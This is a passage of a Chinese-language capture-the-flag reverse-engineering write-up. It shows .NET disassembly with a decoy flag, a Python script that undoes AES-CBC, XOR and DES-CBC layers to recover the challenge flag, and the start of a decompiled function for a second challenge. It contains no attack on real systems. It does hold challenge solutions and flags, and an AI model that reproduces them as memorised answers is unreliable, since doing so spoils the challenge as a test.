<span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3d70: <span class="number">33</span> c9                     <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">3d72: ff <span class="number">15</span> <span class="number">68</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1e0</span>]   // void System<span class="number">.</span>Environment<span class="number">.</span>Exit(<span class="keyword">int</span>) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">3d78: <span class="number">48</span> 8b <span class="number">15</span> d9 <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c558</span>] // <span class="string">&quot;flag&#123;i_am_the_true_flag&#125;&quot;</span> (STRING_HANDLE)		//以下均为假逻辑</span><br><span class="line">3d7f: <span class="number">48</span> 8b <span class="number">12</span>                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rdx</span>]</span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3d82: <span class="number">48</span> 8b ce                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3d85: ff <span class="number">15</span> <span class="number">5d</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1e8</span>]   // bool System<span class="number">.</span>String<span class="number">.</span>op_Equality(string, string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">3d8b: <span class="number">84</span> c0                     <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">3d8d: <span class="number">74</span> <span class="number">12</span>                     <span class="keyword">je</span>      <span class="number">0x3da1</span></span><br><span class="line">3d8f: <span class="number">48</span> 8b <span class="number">0d</span> ba <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c550</span>] // <span class="string">&quot;Right!&quot;</span> (STRING_HANDLE)</span><br><span class="line">3d96: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3d99: ff <span class="number">15</span> <span class="number">19</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3d9f: eb <span class="number">10</span>                     <span class="keyword">jmp</span>     <span class="number">0x3db1</span></span><br><span class="line">3da1: <span class="number">48</span> 8b <span class="number">0d</span> a0 <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c548</span>] // <span class="string">&quot;Wrong!&quot;</span> (STRING_HANDLE)</span><br><span class="line">3da8: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3dab: ff <span class="number">15</span> <span class="number">07</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3db1: b9 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>            <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">3</span></span><br><span class="line">3db6: ff <span class="number">15</span> ac <span class="number">83</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">                                <span class="built_in">RAX</span> is live</span><br><span class="line">3dbc: <span class="number">48</span> <span class="number">8d</span> <span class="number">0d</span> ed f8 ff ff      <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="number">0x36b0</span>]</span><br><span class="line">3dc3: <span class="number">66</span> 8b <span class="number">11</span>                  <span class="keyword">mov</span>     <span class="built_in">dx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">3dc6: <span class="number">66</span> <span class="number">89</span> <span class="number">50</span> <span class="number">10</span>               <span class="keyword">mov</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">16</span>], <span class="built_in">dx</span></span><br><span class="line">3dca: 8a <span class="number">51</span> <span class="number">02</span>                  <span class="keyword">mov</span>     <span class="built_in">dl</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">2</span>]</span><br><span class="line">3dcd: <span class="number">88</span> <span class="number">50</span> <span class="number">12</span>                  <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">18</span>], <span class="built_in">dl</span></span><br><span class="line">3dd0: <span class="number">48</span> 8b ce                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3dd3: <span class="number">48</span> 8b d0                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3dd6: ff <span class="number">15</span> ac <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c288</span>]   // <span class="built_in">byte</span>[] where<span class="number">.</span>rc4<span class="number">.</span>ToRC4(string, <span class="built_in">byte</span>[]) (METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">                                <span class="built_in">RSI</span> is dead</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3ddc: <span class="number">48</span> 8b f0                  <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RSI</span> is live</span><br><span class="line">3ddf: b9 <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>            <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">64</span></span><br><span class="line">3de4: ff <span class="number">15</span> 7e <span class="number">83</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">3dea: <span class="number">48</span> 8b f8                  <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RDI</span> is live</span><br><span class="line">3ded: <span class="number">48</span> <span class="number">8d</span> <span class="number">0d</span> cc f9 ff ff      <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="number">0x37c0</span>]</span><br><span class="line">3df4: 0f <span class="number">10</span> <span class="number">01</span>                  <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">3df7: 0f <span class="number">11</span> <span class="number">47</span> <span class="number">10</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">16</span>], <span class="built_in">xmm0</span></span><br><span class="line">3dfb: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">10</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">16</span>]</span><br><span class="line">3dff: 0f <span class="number">11</span> <span class="number">47</span> <span class="number">20</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">32</span>], <span class="built_in">xmm0</span></span><br><span class="line">3e03: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">20</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">32</span>]</span><br><span class="line">3e07: 0f <span class="number">11</span> <span class="number">47</span> <span class="number">30</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">48</span>], <span class="built_in">xmm0</span></span><br><span class="line">3e0b: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">30</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">48</span>]</span><br><span class="line">3e0f: 0f <span class="number">11</span> <span class="number">47</span> <span class="number">40</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">64</span>], <span class="built_in">xmm0</span></span><br><span class="line">3e13: <span class="number">48</span> 8b ce                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e16: <span class="number">48</span> 8b d7                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rdi</span></span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3e19: ff <span class="number">15</span> <span class="number">39</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c258</span>]   // bool where<span class="number">.</span>QZoPKLYRExWdGJMn<span class="number">.</span>check1(<span class="built_in">byte</span>[], <span class="built_in">byte</span>[]) (METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">                                <span class="built_in">RAX</span> is dead</span><br><span class="line">3e1f: <span class="number">84</span> c0                     <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">3e21: <span class="number">74</span> <span class="number">32</span>                     <span class="keyword">je</span>      <span class="number">0x3e55</span></span><br><span class="line">3e23: <span class="number">48</span> 8b ce                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e26: <span class="number">48</span> 8b d7                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rdi</span></span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3e29: ff <span class="number">15</span> <span class="number">39</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c268</span>]   // bool where<span class="number">.</span>TYuNpWqDZfXoRJvB<span class="number">.</span>check2(<span class="built_in">byte</span>[], <span class="built_in">byte</span>[]) (METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">3e2f: <span class="number">84</span> c0                     <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">3e31: <span class="number">74</span> <span class="number">22</span>                     <span class="keyword">je</span>      <span class="number">0x3e55</span></span><br><span class="line">3e33: <span class="number">48</span> 8b ce                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e36: <span class="number">48</span> 8b d7                  <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rdi</span></span><br><span class="line">                                <span class="built_in">RDX</span> is live</span><br><span class="line">3e39: ff <span class="number">15</span> <span class="number">31</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c270</span>]   // bool where<span class="number">.</span>rc4<span class="number">.</span>check3(<span class="built_in">byte</span>[], <span class="built_in">byte</span>[]) (METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RDX</span> is dead</span><br><span class="line">                                <span class="built_in">RSI</span> is dead</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">                                <span class="built_in">RDI</span> is dead</span><br><span class="line">3e3f: <span class="number">84</span> c0                     <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">3e41: <span class="number">74</span> <span class="number">12</span>                     <span class="keyword">je</span>      <span class="number">0x3e55</span></span><br><span class="line">3e43: <span class="number">48</span> 8b <span class="number">0d</span> <span class="number">06</span> <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c550</span>] // <span class="string">&quot;Right!&quot;</span> (STRING_HANDLE)</span><br><span class="line">3e4a: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e4d: ff <span class="number">15</span> <span class="number">65</span> <span class="number">83</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3e53: eb <span class="number">10</span>                     <span class="keyword">jmp</span>     <span class="number">0x3e65</span></span><br><span class="line">3e55: <span class="number">48</span> 8b <span class="number">0d</span> ec <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c548</span>] // <span class="string">&quot;Wrong!&quot;</span> (STRING_HANDLE)</span><br><span class="line">3e5c: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e5f: ff <span class="number">15</span> <span class="number">53</span> <span class="number">83</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3e65: <span class="number">48</span> 8b <span class="number">0d</span> f4 <span class="number">86</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c560</span>] // <span class="string">&quot;Do you believe me?&quot;</span> (STRING_HANDLE)</span><br><span class="line">3e6c: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3e6f: ff <span class="number">15</span> <span class="number">43</span> <span class="number">83</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3e75: <span class="number">90</span>                        <span class="keyword">nop</span></span><br><span class="line">3e76: <span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>               <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">32</span></span><br><span class="line">3e7a: 5b                        <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line">3e7b: <span class="number">5d</span>                        <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line">3e7c: 5e                        <span class="keyword">pop</span>     <span class="built_in">rsi</span></span><br><span class="line">3e7d: 5f                        <span class="keyword">pop</span>     <span class="built_in">rdi</span></span><br><span class="line">3e7e: <span class="number">41</span> 5c                     <span class="keyword">pop</span>     <span class="built_in">r12</span></span><br><span class="line">3e80: <span class="number">41</span> 5e                     <span class="keyword">pop</span>     <span class="built_in">r14</span></span><br><span class="line">3e82: <span class="number">41</span> 5f                     <span class="keyword">pop</span>     <span class="built_in">r15</span></span><br><span class="line">3e84: c3                        <span class="keyword">ret</span></span><br><span class="line">3e85: ff <span class="number">15</span> <span class="number">45</span> <span class="number">82</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c0d0</span>]   // RNG_CHK_FAIL (HELPER)</span><br><span class="line">3e8b: cc                        <span class="keyword">int3</span></span><br></pre></td></tr></table></figure>
<p>发现一共有四层加密，DES_CBC、两个异或和一个AES_CBC，编写解密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, DES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    key = <span class="string">b&quot;A1B2C3D4E5F6G7H8&quot;</span></span><br><span class="line">    iv = <span class="string">b&quot;H8G7F6E5D4C3B2A1&quot;</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>(cipher.decrypt(plaintext))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_cbc_decrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    key = <span class="string">b&quot;Z1Y2X3W4&quot;</span></span><br><span class="line">    iv = <span class="string">b&quot;W4X3Y2Z1&quot;</span></span><br><span class="line">    cipher = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>(cipher.decrypt(plaintext))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">encflag = <span class="built_in">bytearray</span>([<span class="number">0x96</span>, <span class="number">0x57</span>, <span class="number">0x55</span>, <span class="number">0x7f</span>, <span class="number">0x25</span>, <span class="number">0xb0</span>, <span class="number">0x7d</span>, <span class="number">0xf9</span>, <span class="number">0xe7</span>, <span class="number">0x4f</span>, <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x9b</span>, <span class="number">0x71</span>, <span class="number">0xdf</span>, </span><br><span class="line">                     <span class="number">0x03</span>, <span class="number">0x42</span>, <span class="number">0x99</span>, <span class="number">0xe7</span>, <span class="number">0x99</span>, <span class="number">0xee</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x82</span>, <span class="number">0xdf</span>, <span class="number">0xad</span>, <span class="number">0x55</span>, <span class="number">0xb8</span>, <span class="number">0xf0</span>, <span class="number">0x75</span>, <span class="number">0xa2</span>, </span><br><span class="line">                     <span class="number">0xa7</span>, <span class="number">0x48</span>, <span class="number">0x2a</span>, <span class="number">0xa5</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x58</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x46</span>, <span class="number">0xb2</span>, <span class="number">0x79</span>, <span class="number">0xbe</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x7c</span>, </span><br><span class="line">                     <span class="number">0x70</span>, <span class="number">0xce</span>, <span class="number">0x83</span>, <span class="number">0x50</span>, <span class="number">0x9b</span>, <span class="number">0xed</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x4d</span>, <span class="number">0x26</span>, <span class="number">0x03</span>, <span class="number">0x34</span>, <span class="number">0x1d</span>, <span class="number">0x90</span>, <span class="number">0x87</span>, <span class="number">0x85</span>])</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;r2r&#x27;</span></span><br><span class="line"></span><br><span class="line">encflag = aes_cbc_decrypt(encflag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)):</span><br><span class="line">    encflag[i] ^= key[i%<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)):</span><br><span class="line">    encflag[i] ^= i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">encflag = des_cbc_decrypt(encflag)</span><br><span class="line"><span class="built_in">print</span>(encflag)</span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{1_@m_th3_$3cr3t_h1dd3n_1n_th3_d3p7h}</strong></font>.</p>
<h2 id="Loading-flag…："><a href="#Loading-flag…：" class="headerlink" title="Loading flag…："></a>Loading flag…：</h2><p>发现是一个走得极慢的进度条，按下按钮也不可能合理时间内出结果，ida动态调试找到关键函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line">__m128i *__fastcall <span class="title function_">sub_7FF7FA0F86A0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span 